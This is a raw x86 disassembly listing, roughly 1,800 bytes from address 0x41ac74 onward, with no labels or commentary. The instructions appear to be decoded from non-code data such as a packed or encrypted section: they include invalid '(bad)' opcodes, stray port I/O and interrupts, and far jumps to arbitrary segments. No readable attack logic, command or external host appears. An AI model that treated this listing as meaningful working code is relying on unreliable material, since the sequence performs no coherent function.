  41ac74:	arpl   WORD PTR [ecx-0x7],cx
  41ac77:	sbb    ch,dl
  41ac79:	fidiv  DWORD PTR [ebx]
  41ac7b:	in     eax,0x8e
  41ac7d:	mov    eax,0xb7b34b29
  41ac82:	aad    0xdb
  41ac84:	call   0x3e5066a1
  41ac89:	add    al,0xd1
  41ac8b:	jle    0x41ac10
  41ac8d:	fld    DWORD PTR cs:[eax-0x30dd2e7c]
  41ac94:	sub    ebp,eax
  41ac96:	cwde   
  41ac97:	aas    
  41ac98:	jge    0x41ad05
  41ac9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac9b:	(bad)  [eax+0x1d]
  41ac9e:	or     bh,BYTE PTR [edi]
  41aca0:	aas    
  41aca1:	rcl    BYTE PTR [eax+0x7df3de50],0xfa
  41aca8:	rcl    ecx,0xe8
  41acab:	mov    bh,0x20
  41acad:	fbld   TBYTE PTR [eax-0x2e777702]
  41acb3:	mov    dh,0x2b
  41acb5:	pushf  
  41acb6:	(bad)  
  41acb7:	aas    
  41acb8:	dec    edx
  41acb9:	out    0x71,al
  41acbb:	inc    eax
  41acbc:	and    eax,0xdec0f06
  41acc1:	cwde   
  41acc2:	fist   WORD PTR [ecx]
  41acc4:	mov    eax,ds:0x254c50ac
  41acc9:	int3   
  41acca:	loopne 0x41ac4c
  41accc:	repnz pop ebx
  41acce:	add    BYTE PTR [ebx+0x36834c71],bh
  41acd4:	xchg   edi,eax
  41acd5:	inc    esp
  41acd6:	push   cs
  41acd7:	add    al,0x60
  41acd9:	inc    ecx
  41acda:	xchg   BYTE PTR [ebx+0x1b],dh
  41acdd:	push   es
  41acde:	mov    ch,0xb5
  41ace0:	shl    BYTE PTR [edi-0x50],cl
  41ace3:	(bad)  
  41ace4:	fisubr DWORD PTR [esi-0x19]
  41ace7:	pop    edx
  41ace8:	iret   
  41ace9:	fs iret 
  41aceb:	jmp    0x41ad67
  41aced:	mov    bh,0x2b
  41acef:	leave  
  41acf0:	cdq    
  41acf1:	jl     0x41ad3b
  41acf3:	test   al,0x4c
  41acf5:	mov    edx,0x14616e93
  41acfa:	sub    al,0xf6
  41acfc:	push   ebx
  41acfd:	outs   dx,BYTE PTR ds:[esi]
  41acfe:	jnp    0x41ad15
  41ad00:	popf   
  41ad01:	das    
  41ad02:	and    eax,0x7fa89c61
  41ad07:	arpl   si,si
  41ad09:	xchg   ebp,eax
  41ad0a:	jle    0x41ace5
  41ad0c:	ins    BYTE PTR es:[edi],dx
  41ad0d:	stos   BYTE PTR es:[edi],al
  41ad0e:	jg     0x41aca3
  41ad10:	sbb    ah,BYTE PTR [edx-0x24]
  41ad13:	xchg   esi,eax
  41ad14:	push   edi
  41ad15:	cmc    
  41ad16:	jle    0x41ac98
  41ad18:	or     DWORD PTR ds:0x7ea1bb80,esi
  41ad1e:	pop    ecx
  41ad1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad20:	imul   esi,DWORD PTR [bp+si+0x34],0xe6026377
  41ad28:	xchg   DWORD PTR [esp+edx*8],ebx
  41ad2b:	push   edi
  41ad2c:	and    eax,0xdba12a36
  41ad31:	lock fdivr DWORD PTR ds:0xab4b701c
  41ad38:	jl     0x41ad6f
  41ad3a:	xchg   edx,eax
  41ad3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad3c:	add    DWORD PTR [esi],ebx
  41ad3e:	jmp    0xd6b6:0xeb4183f6
  41ad45:	jecxz  0x41ad2d
  41ad47:	int    0xd0
  41ad49:	dec    edx
  41ad4a:	jmp    0x33a9:0xe256319b
  41ad51:	in     eax,0x40
  41ad53:	and    edi,edx
  41ad55:	fwait
  41ad56:	gs mov ebx,0x93f03efc
  41ad5c:	push   esi
  41ad5d:	outs   dx,BYTE PTR ds:[esi]
  41ad5e:	jbe    0x41ad13
  41ad60:	sbb    al,0xc3
  41ad62:	in     al,0xac
  41ad64:	pop    ds
  41ad65:	pop    ebp
  41ad66:	xchg   DWORD PTR [ebx+0x4c4ccc21],ebp
  41ad6c:	aaa    
  41ad6d:	mov    bl,0xb8
  41ad6f:	jb     0x41adeb
  41ad71:	int3   
  41ad72:	mov    al,ds:0x998f5acf
  41ad77:	clc    
  41ad78:	mov    esp,0xaa659daf
  41ad7d:	push   ecx
  41ad7e:	jecxz  0x41ad91
  41ad80:	and    dl,BYTE PTR [edx]
  41ad82:	pop    eax
  41ad83:	jno    0x41ada4
  41ad85:	fcom   DWORD PTR [edi+eiz*1+0x4b]
  41ad89:	push   esi
  41ad8a:	js     0x41ad39
  41ad8c:	lds    eax,FWORD PTR ds:0xa660301e
  41ad92:	xchg   esi,eax
  41ad93:	in     al,0xa2
  41ad95:	outs   dx,DWORD PTR ds:[esi]
  41ad96:	sbb    ah,ch
  41ad98:	ds mov ebx,0x591502f4
  41ad9e:	fmul   QWORD PTR [eax]
  41ada0:	xchg   esp,eax
  41ada1:	out    dx,al
  41ada2:	pop    esi
  41ada3:	nop
  41ada4:	and    al,0xcb
  41ada6:	jg     0x41ae10
  41ada8:	inc    DWORD PTR [edx-0x5b]
  41adab:	fisttp DWORD PTR [ebx+eiz*2]
  41adae:	sub    ch,bl
  41adb0:	outs   dx,DWORD PTR ds:[esi]
  41adb1:	daa    
  41adb2:	jb     0x41adba
  41adb4:	shl    edi,0xb
  41adb7:	sbb    BYTE PTR [edi],dl
  41adb9:	inc    ebx
  41adba:	imul   esi,DWORD PTR [edx+0x5ba7dd85],0x90a24a77
  41adc4:	hlt    
  41adc5:	sub    BYTE PTR [ecx+0x3dafa207],bl
  41adcb:	push   0xffffffc0
  41adcd:	jo     0x41ad9b
  41adcf:	sahf   
  41add0:	push   esi
  41add1:	cmc    
  41add2:	inc    eax
  41add3:	pop    esi
  41add4:	dec    edx
  41add5:	cmp    edi,DWORD PTR [eax+ebx*1-0x66379218]
  41addc:	sbb    al,0xf1
  41adde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41addf:	xor    DWORD PTR [ecx],edi
  41ade1:	inc    ecx
  41ade2:	sbb    al,0xfb
  41ade4:	call   0xb9fe:0xe703cc63
  41adeb:	xor    ecx,DWORD PTR [ebx+0x6b]
  41adee:	push   ebp
  41adef:	lods   al,BYTE PTR ds:[esi]
  41adf0:	lds    edx,FWORD PTR [ebx-0x2b]
  41adf3:	lods   al,BYTE PTR ds:[esi]
  41adf4:	sbb    ebp,ecx
  41adf6:	into   
  41adf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adf8:	push   esp
  41adf9:	nop
  41adfa:	inc    edx
  41adfb:	dec    eax
  41adfc:	lods   al,BYTE PTR ds:[esi]
  41adfd:	jns    0x41addf
  41adff:	and    BYTE PTR [ebx+ebx*1],ah
  41ae02:	jb     0x41ae13
  41ae04:	cli    
  41ae05:	loopne 0x41ae78
  41ae07:	cmp    bl,BYTE PTR [edx+0x76]
  41ae0a:	dec    ebp
  41ae0b:	push   cs
  41ae0c:	addr16 adc al,0x24
  41ae0f:	lods   eax,DWORD PTR ds:[esi]
  41ae10:	lods   eax,DWORD PTR ds:[esi]
  41ae11:	adc    al,0x81
  41ae13:	mov    eax,ss
  41ae15:	stos   DWORD PTR es:[edi],eax
  41ae16:	inc    esi
  41ae17:	test   DWORD PTR [ecx-0x6],edx
  41ae1a:	das    
  41ae1b:	out    dx,al
  41ae1c:	xchg   ecx,eax
  41ae1d:	scas   eax,DWORD PTR es:[edi]
  41ae1e:	mov    ecx,0x51d8835
  41ae23:	sahf   
  41ae24:	loopne 0x41ae4e
  41ae26:	inc    ecx
  41ae27:	mov    ch,dh
  41ae29:	pushf  
  41ae2a:	cmp    ebp,DWORD PTR [esp+eax*2+0x4cb76903]
  41ae31:	push   edx
  41ae32:	call   0xd7bd:0x84721344
  41ae39:	xchg   DWORD PTR [edx+0x5d],ebx
  41ae3c:	bound  edx,QWORD PTR [edx-0x29]
  41ae3f:	sbb    esp,esp
  41ae41:	mul    BYTE PTR [ecx]
  41ae43:	xchg   DWORD PTR [ecx-0x6a3014ac],esp
  41ae49:	imul   edi,DWORD PTR [ebx+0x52ddd827],0xffffffdc
  41ae50:	sub    dl,0xd0
  41ae53:	jmp    0xda2d2f98
  41ae58:	cs (bad) 
  41ae5a:	xor    ecx,DWORD PTR [esi+ebp*1-0x17]
  41ae5e:	push   edi
  41ae5f:	sub    DWORD PTR [edi-0x6acc444a],ebp
  41ae65:	pop    esi
  41ae66:	out    0x2e,eax
  41ae68:	or     cl,BYTE PTR [ebx+0x7ba50f6b]
  41ae6e:	int3   
  41ae6f:	aad    0x69
  41ae71:	jge    0x41aee0
  41ae73:	sbb    ch,ah
  41ae75:	int3   
  41ae76:	mov    edx,0x9c053188
  41ae7b:	push   cs
  41ae7c:	sbb    al,0x39
  41ae7e:	sub    BYTE PTR [eax-0x4a],bh
  41ae81:	int    0x66
  41ae83:	add    al,0x89
  41ae85:	xor    al,0xdf
  41ae87:	int3   
  41ae88:	bound  ecx,QWORD PTR [edi]
  41ae8a:	daa    
  41ae8b:	jecxz  0x41aebe
  41ae8d:	push   cs
  41ae8e:	in     eax,dx
  41ae8f:	push   ebp
  41ae90:	and    eax,0x423dc1ed
  41ae95:	and    ch,dh
  41ae97:	add    BYTE PTR [edi],bh
  41ae99:	adc    ebx,DWORD PTR [ebx+0x2ccafdf2]
  41ae9f:	(bad)  
  41aea0:	mov    ebx,DWORD PTR [edi+ebx*2]
  41aea3:	mov    ds:0x710c7961,eax
  41aea8:	dec    BYTE PTR [edx+ebx*1]
  41aeab:	cmp    al,BYTE PTR [edx-0x1efcc89d]
  41aeb1:	das    
  41aeb2:	loope  0x41aea0
  41aeb4:	jp     0x41ae89
  41aeb6:	popa   
  41aeb7:	pop    ecx
  41aeb8:	aaa    
  41aeb9:	aad    0xf2
  41aebb:	out    0xc7,al
  41aebd:	inc    edx
  41aebe:	stos   DWORD PTR es:[edi],eax
  41aebf:	xor    bh,0x86
  41aec2:	xchg   esi,eax
  41aec3:	mov    cl,BYTE PTR [edx-0x6f0da347]
  41aec9:	jns    0x41aea2
  41aecb:	hlt    
  41aecc:	scas   eax,DWORD PTR es:[edi]
  41aecd:	xor    eax,0xa6574be4
  41aed2:	pop    esp
  41aed3:	out    dx,al
  41aed4:	xchg   esi,eax
  41aed5:	push   ecx
  41aed6:	jl     0x41aecc
  41aed8:	je     0x41af34
  41aeda:	fadd   DWORD PTR [edi-0x30]
  41aedd:	mov    ebx,0x1c3a4305
  41aee2:	call   0xd1f1cce4
  41aee7:	or     esp,DWORD PTR [ebx+0x2b]
  41aeea:	push   ebp
  41aeeb:	mov    DWORD PTR [edx+0x6],eax
  41aeee:	in     al,dx
  41aeef:	ds in  eax,0xea
  41aef2:	and    eax,0xffffffe6
  41aef5:	cmp    al,0xb4
  41aef7:	sti    
  41aef8:	or     al,0x3b
  41aefa:	push   esp
  41aefb:	fsub   st(6),st
  41aefd:	adc    bl,BYTE PTR [ecx-0x71927a00]
  41af03:	cmp    DWORD PTR [esi+0x5],edx
  41af06:	mov    esi,0x76d0576d
  41af0b:	jnp    0x41ae8d
  41af0d:	xchg   edi,eax
  41af0e:	int    0x1f
  41af10:	inc    ebp
  41af11:	test   cl,0x91
  41af14:	pop    ss
  41af15:	jecxz  0x41aed8
  41af17:	push   cs
  41af18:	add    eax,0xfc5e79ed
  41af1d:	add    ch,BYTE PTR [esi]
  41af1f:	or     BYTE PTR [ecx+0x4e],cl
  41af22:	pop    edi
  41af23:	out    dx,al
  41af24:	loop   0x41af2d
  41af26:	mov    edi,ebx
  41af28:	shl    DWORD PTR [ecx],cl
  41af2a:	loope  0x41afa6
  41af2c:	mov    cl,BYTE PTR [edx+ecx*8]
  41af2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af30:	xlat   BYTE PTR ds:[ebx]
  41af31:	test   eax,0x91d9920b
  41af36:	stos   DWORD PTR es:[edi],eax
  41af37:	sub    DWORD PTR [edx],edx
  41af39:	and    eax,0xe76a1255
  41af3e:	(bad)  
  41af3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af40:	loop   0x41af8f
  41af42:	jbe    0x41af05
  41af44:	aam    0x0
  41af46:	aam    0xd1
  41af48:	repz sub ecx,DWORD PTR [edx]
  41af4b:	dec    esp
  41af4c:	and    BYTE PTR [ebx+ecx*1+0x7d],0xb6
  41af51:	in     eax,0x3
  41af53:	lahf   
  41af54:	inc    ebx
  41af55:	sbb    DWORD PTR [edi],ecx
  41af57:	jecxz  0x41afb1
  41af59:	fxam   
  41af5b:	mov    eax,0xf58e7d95
  41af60:	jmp    0x41aeef
  41af62:	sbb    ecx,DWORD PTR [ecx-0x3524e423]
  41af68:	xchg   DWORD PTR [ecx-0x71ef640],edi
  41af6e:	cmp    esp,0x1
  41af71:	jl     0x41af44
  41af73:	jmp    0x2403f1e3
  41af78:	scas   eax,DWORD PTR es:[edi]
  41af79:	out    dx,al
  41af7a:	pop    es
  41af7b:	jnp    0x41afa7
  41af7d:	loope  0x41afc8
  41af7f:	std    
  41af80:	loop   0x41af7c
  41af82:	ins    BYTE PTR es:[edi],dx
  41af83:	shr    BYTE PTR [ebx],1
  41af85:	mov    ch,0x2c
  41af87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af88:	jmp    0xdf96:0x855a438e
  41af8f:	cdq    
  41af90:	dec    esi
  41af91:	cmp    bl,ch
  41af93:	shl    BYTE PTR [ecx+0x49126f89],0x3
  41af9a:	and    ecx,DWORD PTR [edi]
  41af9c:	cli    
  41af9d:	inc    ebx
  41af9e:	je     0x41af7a
  41afa0:	xchg   bl,bl
  41afa2:	inc    ecx
  41afa3:	xor    al,0xec
  41afa5:	ss cwde 
  41afa7:	pop    ds
  41afa8:	push   cs
  41afa9:	rcl    DWORD PTR [eax+0x43],1
  41afac:	sahf   
  41afad:	add    eax,0x48531497
  41afb2:	lock outs dx,BYTE PTR ds:[esi]
  41afb4:	inc    ebx
  41afb5:	adc    al,0xff
  41afb7:	mov    gs,WORD PTR [edi-0x30]
  41afba:	ret    0x8856
  41afbd:	xchg   BYTE PTR [edi+0x5b],ch
  41afc0:	rcr    BYTE PTR ds:0x451be4dc,cl
  41afc6:	call   0x105a5369
  41afcb:	shr    BYTE PTR [ebp-0x15bbd3f7],1
  41afd1:	sbb    BYTE PTR [edx+esi*2],ch
  41afd4:	hlt    
  41afd5:	lea    ecx,[ebx+0x2]
  41afd8:	ret    
  41afd9:	xlat   BYTE PTR ds:[ebx]
  41afda:	icebp  
  41afdb:	push   cs
  41afdc:	in     eax,0xac
  41afde:	sbb    BYTE PTR [ebx-0x1a],bl
  41afe1:	cmp    ah,cl
  41afe3:	scas   al,BYTE PTR es:[edi]
  41afe4:	les    edx,FWORD PTR [edx-0x64f9c9f4]
  41afea:	out    0xc3,eax
  41afec:	xchg   edx,eax
  41afed:	arpl   WORD PTR [edx+ecx*1],dx
  41aff0:	push   es
  41aff1:	js     0x41afb7
  41aff3:	sahf   
  41aff4:	cmc    
  41aff5:	inc    esi
  41aff6:	xor    al,0xeb
  41aff8:	cmp    BYTE PTR [ebp*1-0x700decb5],al
  41afff:	(bad)  
  41b000:	sti    
  41b001:	dec    edx
  41b002:	add    ah,BYTE PTR [edi]
  41b004:	xchg   esi,eax
  41b005:	out    0x25,eax
  41b007:	push   esi
  41b008:	mov    eax,ds:0x3d650f95
  41b00d:	lods   al,BYTE PTR ds:[esi]
  41b00e:	mov    ecx,0x842ae5f6
  41b013:	lea    edi,[ebp+0x3d79f654]
  41b019:	fcmovne st,st(2)
  41b01b:	dec    ebp
  41b01c:	out    0xa9,eax
  41b01e:	sbb    ebx,DWORD PTR [ecx]
  41b020:	mov    ds:0x8337cb68,eax
  41b025:	sbb    bh,0xbb
  41b028:	retf   
  41b029:	inc    esp
  41b02a:	mov    eax,ds:0xc9eab701
  41b02f:	cli    
  41b030:	sub    al,BYTE PTR [ebx*2+0xcfca97e]
  41b037:	shl    DWORD PTR [esi+0x4b],cl
  41b03a:	shl    DWORD PTR [ebx-0x5a5e638],cl
  41b040:	jns    0x41b0a3
  41b042:	neg    BYTE PTR [edi-0x3caebe3e]
  41b048:	and    dh,BYTE PTR [edi+0x576e29ec]
  41b04e:	fwait
  41b04f:	mov    bh,0xde
  41b051:	jbe    0x41b037
  41b053:	sub    al,0x8b
  41b055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b056:	hlt    
  41b057:	pop    esp
  41b058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b059:	jl     0x41b06d
  41b05b:	or     edi,edi
  41b05d:	pop    edi
  41b05e:	stos   DWORD PTR es:[di],eax
  41b060:	fist   WORD PTR [ecx]
  41b062:	in     ax,0xca
  41b065:	cmp    eax,0x5676b60b
  41b06a:	dec    edx
  41b06b:	or     al,0x66
  41b06d:	mov    DWORD PTR [eax],ebx
  41b06f:	adc    DWORD PTR [ebp+edi*8+0x3d88f8a8],esi
  41b076:	imul   edi,DWORD PTR [eax+0x6c],0xffffff9b
  41b07a:	test   BYTE PTR [ecx+0x11],0x81
  41b07e:	mov    dh,0x6
  41b080:	push   0xffffffa1
  41b082:	repnz add ch,BYTE PTR [edx]
  41b085:	cdq    
  41b086:	and    BYTE PTR [esp+ebx*4-0x67c0e2ee],bl
  41b08d:	out    dx,eax
  41b08e:	pushf  
  41b08f:	cld    
  41b090:	rcr    DWORD PTR [eax+eax*2],1
  41b093:	in     eax,0xef
  41b095:	cmc    
  41b096:	cdq    
  41b097:	shl    DWORD PTR [eax-0x5c],cl
  41b09a:	xchg   ebx,eax
  41b09b:	push   0xc39ca2ca
  41b0a0:	sbb    DWORD PTR [edi+esi*1+0x6bf1e6b3],esp
  41b0a7:	inc    ecx
  41b0a8:	mov    edi,0x6b726822
  41b0ad:	push   esi
  41b0ae:	sar    BYTE PTR [edx-0x73a24efb],cl
  41b0b4:	stc    
  41b0b5:	out    0xc5,eax
  41b0b7:	xchg   DWORD PTR ds:0xf1ebc90d,ebx
  41b0bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0be:	shl    DWORD PTR [ecx+0xeade0de],0xe9
  41b0c5:	mov    edx,0xc99c772a
  41b0ca:	push   ax
  41b0cc:	or     dh,BYTE PTR [esi+eax*4-0x3adb94]
  41b0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0d4:	jae    0x41b0cd
  41b0d6:	test   BYTE PTR [eax+0x7d],ch
  41b0d9:	pushf  
  41b0da:	xchg   esp,eax
  41b0db:	mov    al,ds:0x7a20addd
  41b0e0:	xor    eax,0x97c66130
  41b0e5:	ror    ebp,1
  41b0e7:	stos   DWORD PTR es:[edi],eax
  41b0e8:	xchg   esp,eax
  41b0e9:	xchg   ebp,eax
  41b0ea:	ds mov ebp,0xc3e0ae7e
  41b0f0:	mov    al,0x75
  41b0f2:	add    al,0x7e
  41b0f4:	and    BYTE PTR [esi],0x7b
  41b0f7:	push   ds
  41b0f8:	push   ebx
  41b0f9:	nop
  41b0fa:	push   ebx
  41b0fb:	ret    0xa4a9
  41b0fe:	pop    edi
  41b0ff:	outs   dx,BYTE PTR ds:[esi]
  41b100:	fwait
  41b101:	mov    dh,0x36
  41b103:	push   0xcf8fb658
  41b108:	mov    al,0xa4
  41b10a:	inc    eax
  41b10b:	in     eax,0x9e
  41b10d:	int    0x9e
  41b10f:	mov    eax,ds:0x922cf2e1
  41b114:	and    cl,BYTE PTR [esi-0x727aee82]
  41b11a:	mov    ebp,0x48453aac
  41b11f:	xchg   esp,eax
  41b120:	jb     0x41b15b
  41b122:	or     dl,al
  41b124:	inc    edx
  41b125:	jae    0x41b15a
  41b127:	and    edx,DWORD PTR [edx]
  41b129:	sbb    ecx,DWORD PTR [edx]
  41b12b:	aaa    
  41b12c:	jecxz  0x41b141
  41b12e:	xchg   edx,eax
  41b12f:	dec    eax
  41b130:	nop
  41b131:	int3   
  41b132:	sub    al,0xd3
  41b134:	dec    eax
  41b135:	ret    
  41b136:	int3   
  41b137:	retf   0xefb3
  41b13a:	mov    edi,0x894c13d9
  41b13f:	je     0x41b0e0
  41b141:	dec    eax
  41b142:	xchg   ebx,eax
  41b143:	test   al,0x6
  41b145:	inc    esi
  41b146:	data16 mov bh,0x89
  41b149:	push   esi
  41b14a:	imul   ebp,DWORD PTR [edi+0x3c],0xffffffef
  41b14e:	sub    eax,esi
  41b150:	fadd   QWORD PTR [edi]
  41b152:	xchg   dh,cl
  41b154:	out    dx,al
  41b155:	sbb    al,0xfd
  41b157:	push   ds
  41b158:	lea    ecx,[eax-0x417a2e58]
  41b15e:	mov    edx,0xaa643036
  41b163:	fcmovne st,st(7)
  41b165:	inc    ebp
  41b166:	sbb    dl,cl
  41b168:	mov    eax,0xd27ad739
  41b16d:	dec    eax
  41b16e:	ror    DWORD PTR [edi-0x60],cl
  41b171:	push   eax
  41b172:	mov    DWORD PTR ds:0x351488ed,ebp
  41b178:	ds out 0x33,eax
  41b17b:	ficomp DWORD PTR [ebx-0x716ffd12]
  41b181:	imul   edx,DWORD PTR [ecx],0xffffffa4
  41b184:	lea    edx,[esi+esi*4-0x81b1bd0]
  41b18b:	push   edx
  41b18c:	cmp    DWORD PTR [eax],esi
  41b18e:	mov    ah,0x5
  41b190:	clc    
  41b191:	cwde   
  41b192:	mov    WORD PTR [edi+0x7fc24fa],fs
  41b198:	xlat   BYTE PTR ds:[ebx]
  41b199:	call   0xbe96743
  41b19e:	leave  
  41b19f:	call   0x9de1ba85
  41b1a4:	jg     0x41b188
  41b1a6:	mov    bh,0x14
  41b1a8:	adc    al,0x5a
  41b1aa:	pop    ds
  41b1ab:	pusha  
  41b1ac:	adc    al,0x9c
  41b1ae:	scas   al,BYTE PTR es:[edi]
  41b1af:	test   eax,0x237cdf6
  41b1b4:	mov    ah,BYTE PTR [edx]
  41b1b6:	icebp  
  41b1b7:	dec    ecx
  41b1b8:	push   edi
  41b1b9:	add    BYTE PTR [esi],cl
  41b1bb:	mov    ebx,ecx
  41b1bd:	cmp    cl,BYTE PTR [ebx]
  41b1bf:	mov    bh,0x72
  41b1c1:	(bad)  
  41b1c2:	shl    ebp,cl
  41b1c4:	mov    bh,al
  41b1c6:	sub    BYTE PTR [ebx],bh
  41b1c8:	imul   esp,DWORD PTR [edx],0x3e3b11cd
  41b1ce:	jg     0x41b207
  41b1d0:	or     eax,0xf8e186be
  41b1d5:	add    al,0x72
  41b1d7:	cwde   
  41b1d8:	sub    BYTE PTR [ebx+eax*4+0xdf74440],bl
  41b1df:	int    0x1f
  41b1e1:	dec    edi
  41b1e2:	mov    edi,0xb4189582
  41b1e7:	addr16 cmp eax,0x55c7f23
  41b1ed:	adc    BYTE PTR [edi-0x3a],al
  41b1f0:	popa   
  41b1f1:	ret    0xcafd
  41b1f4:	mov    eax,0x352292da
  41b1f9:	jno    0x41b265
  41b1fb:	aas    
  41b1fc:	ficomp DWORD PTR [ebp+0x6eab6cf0]
  41b202:	int    0x1b
  41b204:	adc    al,BYTE PTR [ebp+0x3aac082a]
  41b20a:	jno    0x41b27e
  41b20c:	sub    cl,dl
  41b20e:	test   al,0x1a
  41b210:	(bad)  
  41b211:	sub    eax,0xc7ef3813
  41b216:	sbb    al,0xec
  41b218:	loop   0x41b1bf
  41b21a:	push   cs
  41b21b:	sbb    edi,DWORD PTR [edi-0x579c128]
  41b221:	dec    esi
  41b222:	(bad)  
  41b223:	imul   ebp,DWORD PTR [edx+ecx*8+0x31],0x8819ac01
  41b22b:	call   0xeef1:0x9d135ad8
  41b232:	mov    ecx,0x51e5d8c9
  41b237:	or     bl,BYTE PTR [ecx-0x4db14c20]
  41b23d:	xchg   BYTE PTR [ebx],dh
  41b23f:	cmp    BYTE PTR [edx],dh
  41b241:	nop
  41b242:	mov    bh,0x61
  41b244:	jbe    0x41b21f
  41b246:	cmp    al,0x6
  41b248:	add    al,0x55
  41b24a:	fdiv   st,st(3)
  41b24c:	xchg   edx,eax
  41b24d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b24e:	popf   
  41b24f:	repz mov ?,esi
  41b252:	arpl   dx,bx
  41b254:	adc    al,0xc0
  41b256:	pop    ss
  41b257:	add    esp,DWORD PTR [ecx]
  41b259:	sbb    BYTE PTR [esi+edi*1],bh
  41b25c:	xor    BYTE PTR [eax+ebx*4-0x46d8c598],al
  41b263:	and    eax,0xc76f412e
  41b268:	ja     0x41b235
  41b26a:	aas    
  41b26b:	dec    esp
  41b26c:	fs aas 
  41b26e:	test   BYTE PTR [edx+0x4825c8a0],0x11
  41b275:	mov    ah,0x77
  41b277:	jl     0x41b22d
  41b279:	sbb    BYTE PTR [eax+0x7b],ah
  41b27c:	xchg   esi,eax
  41b27d:	pop    esp
  41b27e:	ja     0x41b2e1
  41b280:	and    eax,0x2380eb53
  41b285:	repz cmp eax,0xeb47e636
  41b28b:	out    0x97,eax
  41b28d:	fld    TBYTE PTR [esi]
  41b28f:	jp     0x41b277
  41b291:	xchg   esi,eax
  41b292:	addr16 daa 
  41b294:	and    esi,ecx
  41b296:	sbb    cl,BYTE PTR [edi+0x1c]
  41b299:	push   eax
  41b29a:	xor    BYTE PTR [ecx-0x8b3b978],cl
  41b2a0:	mov    WORD PTR [esi-0x42],gs
  41b2a3:	mov    esi,0x1ffe909d
  41b2a8:	mov    edi,0x31a9eb51
  41b2ad:	cmp    edx,ecx
  41b2af:	shl    BYTE PTR [ecx+0x433e54a3],cl
  41b2b5:	mov    bh,0xa2
  41b2b7:	xchg   esi,eax
  41b2b8:	gs mov bl,0xda
  41b2bb:	lock test eax,0xf6f1046d
  41b2c1:	rcr    BYTE PTR [edi+0x29b9d504],cl
  41b2c7:	stos   BYTE PTR es:[edi],al
  41b2c8:	mov    al,0x4b
  41b2ca:	sbb    BYTE PTR [edx],ch
  41b2cc:	ja     0x41b2de
  41b2ce:	dec    esp
  41b2cf:	lahf   
  41b2d0:	out    dx,al
  41b2d1:	scas   al,BYTE PTR es:[edi]
  41b2d2:	pusha  
  41b2d3:	dec    ebx
  41b2d4:	sbb    eax,0xcca1c8
  41b2d9:	imul   esi,DWORD PTR [eax-0x69],0xb
  41b2dd:	ds jnp 0x41b2e9
  41b2e0:	and    eax,0x8e0515c2
  41b2e5:	xchg   ecx,eax
  41b2e6:	imul   ebp,DWORD PTR [ebp+esi*2-0x19707db6],0xc998859b
  41b2f1:	jo     0x41b29c
  41b2f3:	xchg   DWORD PTR [edx+0x78],edi
  41b2f6:	push   cs
  41b2f7:	loope  0x41b316
  41b2f9:	or     BYTE PTR [ecx-0x5d],bh
  41b2fc:	jo     0x41b294
  41b2fe:	ja     0xabdc1f36
  41b304:	push   0x2e8caa7
  41b309:	sub    DWORD PTR [edx+0x25],edx
  41b30c:	mov    esi,0x20abcbdb
  41b311:	int    0xc1
  41b313:	ffree  st(1)
  41b315:	mov    BYTE PTR [edi+0x2],al
  41b318:	arpl   bp,ax
  41b31a:	pop    edx
  41b31b:	mov    cs,WORD PTR [ecx*8-0x371c7bed]
  41b322:	imul   eax
  41b324:	ins    DWORD PTR es:[edi],dx
  41b325:	loop   0x41b2f7
  41b327:	aad    0x1b
  41b329:	fsubp  st(1),st
  41b32b:	jl     0x41b30d
  41b32d:	xchg   edi,eax
  41b32e:	cld    
  41b32f:	mov    edx,0x14df43bd
  41b334:	in     al,0x7b
  41b336:	jae    0x41b352
  41b338:	rcl    BYTE PTR [edx],1
  41b33a:	out    dx,eax
  41b33b:	lods   al,BYTE PTR ds:[esi]
  41b33c:	aam    0x3c
  41b33e:	(bad)  
  41b33f:	sub    al,0x25
  41b341:	pop    ebp
  41b342:	jne    0x41b2ea
  41b344:	stos   DWORD PTR es:[edi],eax
  41b345:	test   al,0x3a
  41b347:	int    0xfa
  41b349:	hlt    
  41b34a:	sti    
  41b34b:	das    
  41b34c:	push   es
  41b34d:	jmp    ebp
  41b34f:	pop    esp
  41b350:	cmp    al,BYTE PTR [ecx+0x143cccb7]
  41b356:	mov    dl,0x40
  41b358:	push   ss
  41b359:	fwait
  41b35a:	or     eax,0x4db6ab8b
  41b35f:	jmp    0x41b318
  41b361:	sub    al,0x32
  41b363:	xlat   BYTE PTR ds:[ebx]
  41b364:	nop
  41b365:	int    0xf0
  41b367:	lock adc DWORD PTR [eax-0x2b7f4685],0xfa30cac7
  41b372:	imul   ebx,DWORD PTR [esi+eax*4],0x58754b19
  41b379:	lahf   
  41b37a:	dec    edi
  41b37b:	ds push ss
  41b37d:	aaa    
  41b37e:	sbb    DWORD PTR [edi+ebx*2+0x34bcbd76],ecx
  41b385:	ror    BYTE PTR [edi],0x4b
  41b388:	mov    ebx,0xb9c8c90c
  41b38d:	push   edi
  41b38e:	cld    
  41b38f:	int3   
  41b390:	arpl   WORD PTR [edi+ebx*4-0x3c],sp
  41b394:	jecxz  0x41b3c3
  41b396:	or     DWORD PTR [eax],eax
  41b398:	or     al,bl
  41b39a:	arpl   bp,dx
  41b39c:	mov    ebp,0x59cbe537
  41b3a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3a2:	xor    eax,0x970c7486
  41b3a7:	aas    
  41b3a8:	imul   edx,DWORD PTR [edx-0x4b5c7aa8],0x12
  41b3af:	mov    WORD PTR [esi-0x2a1a5c9e],ds
  41b3b5:	mov    esp,0x8bbd1b9f
  41b3ba:	push   0xd017c7a3
  41b3bf:	inc    esp
  41b3c0:	cmp    eax,0xc51ae553
  41b3c5:	ret    0x2e0b
  41b3c8:	push   eax
  41b3c9:	pop    ebp
  41b3ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3cb:	xchg   edi,eax
  41b3cc:	xchg   edi,eax
